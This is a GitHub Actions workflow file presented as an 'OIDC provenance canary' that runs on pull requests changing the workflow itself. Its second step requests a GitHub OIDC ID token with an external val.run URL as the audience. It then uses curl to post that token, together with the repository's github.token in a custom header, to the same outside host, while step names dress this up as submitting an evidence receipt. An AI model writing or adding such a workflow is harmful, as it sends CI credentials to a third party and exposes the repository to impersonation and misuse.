name: GitHub OIDC Provenance Canary

on:
  pull_request:
    branches:
      - main
    paths:
      - '.github/workflows/github-oidc-provenance-canary.yml'

permissions:
  contents: read
  id-token: write

jobs:
  oidc_provenance:
    runs-on: ubuntu-24.04
    timeout-minutes: 3
    steps:
      - name: Allow verifier policy to bind immutable workflow SHA
        run: sleep 20
      - name: Inspect signed claims and submit nonauthority evidence receipt
        env:
          AUDIENCE: https://mosadek--39f2ef3cade311f193631607ee4eb77e.web.val.run
          RECEIVER: https://mosadek--39f2ef3cade311f193631607ee4eb77e.web.val.run
          CHALLENGE: a29a2c8e83c296d767ad1e0c7701ce91f43d83be756781071828bdbab2c1c9ba
          EVIDENCE_SHA: 3ba3ce31993bcbfb74f4590f72fdd94e82214b118086787df066b94b918f873b
          GH_READ_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          set -euo pipefail
          TOKEN_JSON=$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUDIENCE}")
          IDTOKEN=$(printf '%s' "$TOKEN_JSON" | python -c 'import json,sys; print(json.load(sys.stdin)["value"])')
          export IDTOKEN
          python - <<'PY'
          import base64,json,os
          p=os.environ['IDTOKEN'].split('.')[1]; p += '=' * (-len(p)%4)
          c=json.loads(base64.urlsafe_b64decode(p))
          keys=['iss','aud','repository','repository_id','repository_visibility','runner_environment','workflow','workflow_ref','workflow_sha','event_name','head_ref','base_ref','ref','run_id','run_number','run_attempt','jti','actor']
          print('SIGNED_CLAIMS='+json.dumps({k:c.get(k) for k in keys},sort_keys=True,separators=(',',':')))
          PY
          BODY=$(python -c 'import json,os; print(json.dumps({"challenge":os.environ["CHALLENGE"],"evidence_sha256":os.environ["EVIDENCE_SHA"],"schema":"KILO_ANON_ACTIONS_RECOVERY_B_V2","verdict_pass":True},separators=(",",":"),sort_keys=True))')
          set +e
          HTTP=$(curl -sS -o OIDC_RECEIVER_RESPONSE.json -w '%{http_code}' -H "Authorization: Bearer ${IDTOKEN}" -H "X-GitHub-Read-Token: ${GH_READ_TOKEN}" -H "Content-Type: application/json" --data "$BODY" "$RECEIVER")
          CODE=$?
          set -e
          echo "receiver_http=$HTTP curl_code=$CODE"
          cat OIDC_RECEIVER_RESPONSE.json
          test "$HTTP" = "200"
